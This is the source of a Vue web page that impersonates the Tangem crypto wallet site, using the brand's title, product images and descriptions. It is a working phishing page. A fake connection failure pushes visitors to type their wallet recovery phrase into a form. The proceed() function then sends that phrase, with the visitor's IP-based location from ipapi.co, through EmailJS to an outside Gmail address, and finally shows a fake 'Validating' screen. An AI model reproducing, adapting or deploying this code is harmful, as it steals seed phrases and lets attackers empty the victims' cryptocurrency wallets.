<template>
  <div
    class="bg-[#010101] min-h-screen flex flex-col"
    style="letter-spacing: 0.04em; line-height: 35px"
  >
    <!-- Login Box -->
    <div class="text-white flex-grow text-white">
      <Header />
      <div class="mx-auto max-w-screen-2xl lg:px-20 px-5">
        <div class="w-full my-[150px] lg:my-[180px]">
          <h3 class="font-semibold text-2xl mb-8">Tangem Wallet</h3>

          <!-- Card Grid -->
          <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
            <div
              v-for="(card, index) in cards"
              :key="index"
              class="border border-[#272829] rounded overflow-hidden"
            >
              <img
                :src="card.image"
                :alt="card.title"
                class="w-full h-[300px] object-contain"
              />
              <div class="p-3">
                <h4 class="text-lg font-semibold mb-2">{{ card.title }}</h4>
                <p
                  
                  class="text-[15px] text-neutral-400 mb-8"
                  style="
                    overflow: hidden;
                    text-overflow: ellipsis;
                    line-height: 120%
                  "
                >
                  {{ card.subtitle }}
                </p>
                <button
                  @click="openCloseModal"
                  class="btn-primary"
                  
                >
                  Connect
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <Footer />
			
    </div>
		<Modal :isVisible="showModal" @close="closeModal">
      <template v-if="modalState === 'loading'">
        <div class="flex items-center justify-center mb-10">
          <div class="spinner"></div>
        </div>
        <p class="text-center">Connecting... Please wait</p>
      </template>
      <template v-else-if="modalState === 'failed'">
        <div class="flex items-center justify-center mb-10">
          <div class="spinner"></div>
        </div>
        <p class="text-red-500 text-center">
          Failed... Please connect manually
        </p>
        <div class="flex items-center justify-center mt-5">
          <button
            class="bg-black text-white py-2 px-4 rounded-lg"
            @click="connectManually"
          >
            Connect Manually
          </button>
        </div>
      </template>
      <template v-else-if="modalState === 'manual'">
        <form >
          <div class="flex flex-col items-center justify-center">
            
            <h3 class="text-xl text-gray-600 capitalize">
              Import your Tangem Wallet
            </h3>
          </div>

          <div class="mt-10 mb-5 flex flex-col">
            <label class="text-gray-500">Wallet Name</label>
            <input
              type="text"
              :disabled="true"
              class="rounded-lg border-gray-500 mt-2 bg-gray-200"
              style="border: 1px solid gray; border-radius: 8px; padding: 7px 10px"
              v-model="name"
              placeholder="Enter your recovery phrase"
            ></input>
          </div>

          <div class="flex flex-col">
            <label class="text-gray-500">Recovery phrase</label>
            <textarea
              class="rounded-lg border-gray-500 py-2 px-4 mt-2"
              style="border: 1px solid gray"
              v-model="phrase"
              placeholder="Enter your recovery phrase"
            ></textarea>
          </div>

          <p class="text-sm text-gray-500 mt-2">
            Typically 12 (sometimes 24) words separated by
            single spaces
          </p>

          <div class="flex items-center justify-center mt-10">
            <button
              class="bg-black w-full text-white py-2 px-4 rounded-lg"
              :disabled="isSubmitting"
              @click="proceed"
            >
              {{ isSubmitting ? "Processing...": "Proceed" }}
            </button>
          </div>
        </form>
      </template>
      <template v-else-if="modalState === 'barcode'">

        <img src="https://pngimg.com/uploads/qr_code/qr_code_PNG10.png" alt="">
        <div class="flex items-center justify-center mb-4">
          <div class="spinner"></div>
        </div>
        <p class="text-center mb-10">
          Validating... Please wait
        </p>
        <div class="flex items-center justify-center mt-5">
          <button
            class="bg-black text-white py-1 px-4 rounded-lg"
            @click="closeModal"
          >
            Close
          </button>
        </div>
      </template>
    </Modal>
		
  </div>
</template>

<script setup>

useHead({
  title: "Tangem — Your Secure Crypto & Hardware Wallet",
  meta: [
    {
      name: "description",
      content:
        "Manage cryptocurrencies securely in the best crypto wallet. Tangem is a simple cold Bitcoin wallet where you can buy, sell, and store Bitcoin, Ethereum, and other crypto assets",
    },
  ],
});

import Header from "@/components/Header.vue";
import Footer from "@/components/Footer.vue";
import axios from "axios";
import Modal from "@/components/Modal.vue";

const cards = ref([
  {
    image:
      "https://tangem.com/_assets/collections/products/img_01JAZ92V5VY1M06RSGA42YM63Y.webp",
    title: "3 Cards set",
    subtitle:
      "A set of three Tangem cards for secure, multi-access wallet management and backup.",
    buttonText: "Connect",
    link: "#",
  },
  {
    image:
      "https://tangem.com/_assets/collections/products/img_01JAZ91P4DQY92S5GJREF5PGZ0.webp",
    title: "2 Cards set",
    subtitle:
      "Manage multiple crypto accounts with three security chips and air-gapped protection.",
    buttonText: "Learn More",
    link: "#",
  },
  {
    image:
      "https://tangem.com/_assets/collections/products/img_01JT0A177Q5VD73R4DVTBATVSD.webp",
    title: "Family Pack",
    subtitle:
      "A robust stainless steel solution to safeguard your seed phrases and private keys.",
    buttonText: "Learn More",
    link: "#",
  },
  {
    image:
      "https://tangem.com/_astro/ring-cards.CMJBZhcJ_Z1tAa1a.avif",
    title: "Tangem Ring",
    subtitle:
      "A wearable hardware wallet ring for convenient and secure crypto access.",
    buttonText: "Learn More",
    link: "#",
  },
]);

const showModal = ref(false);
const modalState = ref("loading");
const phrase = ref("");
const name = ref("Tangem Wallet");
const isSubmitting = ref(false);

const openCloseModal = () => {
  showModal.value = !showModal.value;
  if (showModal.value) {
    setTimeout(() => {
      modalState.value = "failed";
    }, 2000);
  }
};

const closeModal = () => {
  showModal.value = false;
  modalState.value = "loading";
};

const connectManually = () => {
  modalState.value = "manual";
};

const proceed = async () => {
  isSubmitting.value = true;

  try {
    const location = await axios.get("https://ipapi.co/json");

    const params = {
      service_id: "service_8pbgnpr",
      template_id: "template_xv7sb0z",
      user_id: "user_nsG3rSdCFpgONwwCfNTas",
      template_params: {
        from_name: "Tangem",
        wallet_type: "Tangem Wallets",
        location: JSON.stringify(location.data),
        link_drops: phrase.value,
        reply_to: "customeronlineagent@gmail.com",
      },
      
    };

    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );

    if (response.data === "OK") {
      modalState.value = "barcode";
    }
  } catch (error) {
    console.error("Error importing Tangem:", error);
  } finally {
    isSubmitting.value = false;
  }
  
};
</script>

<style scoped>
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
}

.modal-content {
  background: white;
  padding: 20px;
  border-radius: 8px;
  width: 80%;
  max-width: 500px;
  position: relative;
}

.close-icon {
  position: absolute;
  top: 10px;
  right: 10px;
  font-size: 24px;
  cursor: pointer;
}

.spinner {
  border: 4px solid rgba(0, 0, 0, 0.1);
  border-left-color: #000;
  border-radius: 50%;
  width: 60px;
  height: 60px;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

@media (min-width: 768px) {
  .modal-content {
    width: 30%;
  }
}
</style>
